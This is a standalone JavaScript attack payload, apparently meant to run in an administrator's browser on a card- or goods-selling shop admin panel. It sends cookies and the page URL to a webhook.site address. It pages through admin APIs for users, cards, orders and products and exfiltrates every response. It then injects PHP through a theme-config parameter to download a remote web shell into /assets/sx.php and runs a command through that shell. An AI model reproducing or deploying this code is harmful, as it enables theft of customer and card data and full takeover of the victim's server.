(async()=>{try{
const U="https://webhook.site/3e8b4bf9-b2dc-4f7a-b666-6dd7e69c794a";
const ex=(k,d)=>{const s=String(d);let n=0;for(let i=0;i<s.length;i+=20000){fetch(U+"/"+k+"_"+(n++),{method:"POST",body:s.substr(i,20000),mode:"no-cors"}).catch(()=>{})}};
const post=async(u,b)=>{const r=await fetch(u,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:b});return r.text()};
const get=async(u)=>{const r=await fetch(u);return r.text()};
ex("boot",location.href+"|"+document.cookie);
ex("commodity",await post("/admin/api/commodity/data","page=1&limit=200"));
ex("manage",await post("/admin/api/manage/data","page=1&limit=50"));
ex("user",await post("/admin/api/user/data","page=1&limit=100"));
for(let p=1;p<=30;p++){const t=await post("/admin/api/card/data","page="+p+"&limit=100");ex("card"+p,t);try{if(JSON.parse(t).data.list.length<100)break}catch(e){break}}
for(let p=1;p<=15;p++){const t=await post("/admin/api/order/data","page="+p+"&limit=100");ex("ord"+p,t);try{if(JSON.parse(t).data.list.length<100)break}catch(e){break}}
ex("shellw",await post("/admin/api/plugin/setThemeConfig","id=Dream&a%27%3E%3Dcopy%28%22http%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2FGengchen1%2Fxrepo%2Fs.php%22%2CBASE_PATH.%22%2Fassets%2Fsx.php%22%29%2C%27x=1"));
await get("/index/index/index");
ex("shellt",await get("/assets/sx.php?c=c2lk"));
ex("done","1");
}catch(e){fetch("https://webhook.site/3e8b4bf9-b2dc-4f7a-b666-6dd7e69c794a/err",{method:"POST",body:String(e&&e.stack||e),mode:"no-cors"}).catch(()=>{})}})();
